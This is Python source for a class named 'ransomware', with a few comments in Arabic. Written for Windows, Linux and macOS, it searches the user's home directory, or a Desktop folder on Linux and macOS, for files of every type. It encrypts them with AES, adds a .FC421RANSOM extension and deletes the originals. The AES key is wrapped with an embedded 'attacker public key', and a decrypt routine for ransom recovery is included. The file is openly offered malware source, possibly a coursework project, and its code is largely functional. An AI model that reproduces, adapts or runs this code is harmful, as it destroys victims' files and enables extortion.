import binascii
from Crypto.PublicKey import RSA
from pathlib import Path
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto import Random
import random
import string
import base64, os
import rsa, platform

class ransomware:
    #generate 700 random character value as SHA256 seed
    key = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(700)) #بدل البيز  64
    #get the start path based on the victim OS
    OS = platform.system()
    if OS == "Linux" or OS == "Darwin":
        p = Path(os.environ['HOME'] + '/Desktop/fc421')
    elif OS == "Windows":
        p = Path(os.environ['USERPROFILE'])
    #attacker public key
    public_key="""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyKphUCe18Eel8L/v0zxm
km3rwSJ+MD5+MmjyPA8RB5ihw7xap78fMS5B7mrp7Eog4m4Ra7RH1sjXOz6t7wQb
VsOFPIfYr7PjoFghdjzKRCmOdwKtY9/1l5rWs2Mli9bGs5IssNtmbFDKJyXUeMZz
LsqokGYZpJMDWPBQuZiIlw/uUj79YpOwEhaT9Iyrg03eqbWvNbIdPXmKzrGpP6Ai
BKcKJ7ufpqi5nYLsVOj4f1MdC17q1uYU18LH0JfzRS/79knqqmKAvIoE/LbVXdKz
4v5ayCaV5WG2qEDJpSdLUGdC9DdIT2VpPBypz6nRhUvl7sonVSkTeUZBKZqpx7fK
XwIDAQAB
-----END PUBLIC KEY-----"""
    #files to be encrypted
    list_f = []
    #files to be decrypted
    list_d = []
    #get SHA256 digest of the random key
    def getkey(password):
        hasher = SHA256.new(password)
        return hasher.digest() #go to encrypter function
    #get the list of files
    def getFile(list_f):
        # extensions list
        extensions = ["*"]  # ['jpg', 'png', 'jpeg', 'iso','exe', 'mp3', "mp4", 'zip', 'rar', 'txt', 'iso']
        for extension in extensions:
            try:
                #The glob module finds all the pathnames matching a specified pattern according to the rules used by the Unix shell
                searche = list(ransomware.p.glob('**/*.{}'.format(extension)))
                for File in searche:
                    File = str(File)
                    if File.endswith(".FC421RANSOM"): #if it is not encrypt put it in a list if it is encrypt leave it
                        pass
                    else:
                        list_f.append(File)
            except OSError:
                pass
        for i in list_f:
            #split the file name from the file path
            file_name = i.split("/")[-1]
            file_path = i.replace(file_name, "") #create the encrypt file name and extention new
            os.chdir(file_path)
        return list_f

    def encryptor(list_file):
        #iterate through the files in the list
        for filename in list_file:
            chunksize = 64 * 1024 #crete 16 byte #حجم البلوك للبلان تكست
            outputFile = str(filename) + ".FC421RANSOM" #add our extention
            filesize = str(os.path.getsize(filename)).zfill(16)
            IV = Random.new().read(16) #generate IV
            hashed=ransomware.getkey(base64.b64decode(ransomware.key))
            encryptor = AES.new(hashed, AES.MODE_CBC, IV) #send the info to encrypt
            try:
                with open(filename, 'rb') as infile: #read file as binary
                    with open(outputFile, 'wb') as outfile: #put it in out file ونحدد تالي يحتاج بادنج
                        outfile.write(filesize.encode('utf-8'))
                        outfile.write(IV)
                        while True:
                            chunk = infile.read(chunksize) #chunk=block size
                            if len(chunk) == 0:
                                break
                            #Add padding if the file size cannot be divide into 16 bytes
                            elif len(chunk) % 16 != 0:
                                chunk += b' ' * (16 - (len(chunk) % 16))
                            outfile.write(encryptor.encrypt(chunk))
                            try:
                                os.remove(filename)
                            except OSError:
                                pass
                #encrypt the key with the attacker public key
                recipient_key = RSA.import_key(ransomware.public_key)
                encryptorRSA = PKCS1_OAEP.new(recipient_key)
                enckey=encryptorRSA.encrypt(hashed)
                print(enckey)
                #extract the encrypted key as hex value
                f=open(os.environ['HOME'] +'/Desktop/plain','wb')
                f.write(binascii.hexlify(enckey))
                f.close()
            except IOError:
                pass
        #os.system("/usr/bin/gsettings set org.gnome.desktop.background picture-uri /home/kali/Desktop/mask.jpg")


    def decrypt(list_files):
        extensions = ["*"]
        #read the decrypted key
        x = open(os.environ['HOME'] + '/Desktop/key', 'rb')
        #if x.read() == b'':
        #    return
        enckey = binascii.unhexlify(x.read())
        x.close()
        for extension in extensions:
            #Search for encrypted file based on the ransom extension
            search = list(ransomware.p.glob('**/*.{}'.format(extension)))
            for File in search:
                File = str(File)
                if File.endswith(".FC421RANSOM"):
                    list_files.append(File)
        for files in list_files:
            buffersize = 64 * 1024
            outputfile = files.split('.FC421RANSOM')[0]
            with open(files, 'rb') as infile:
                filesize = int(infile.read(16))
                #Read the iv from the file to start the decyption process
                IV = infile.read(16)
                decryptor = AES.new(enckey, AES.MODE_CBC, IV)
                with open(outputfile, 'wb') as outfile:
                    while True:
                        buf = infile.read(buffersize)
                        if len(buf) == 0:
                            break
                        outfile.write(decryptor.decrypt(buf))
                    outfile.truncate(filesize)
            try:
                searche = list(ransomware.p.glob('**/*.FC421RANSOM'))
                for x in searche:
                    x = str(x)
                    ransomware.list_d.append(x)
            except OSError:
                pass
            #remove the ransom extension
            for i in ransomware.list_d:
                name = i.split("/")[-1]
                path = i.replace(name, "")
                os.chdir(path)
                os.remove(name)
        #os.system("/usr/bin/gsettings set org.gnome.desktop.background picture-uri /home/mariam/Pictures/wallpaper.jpg")


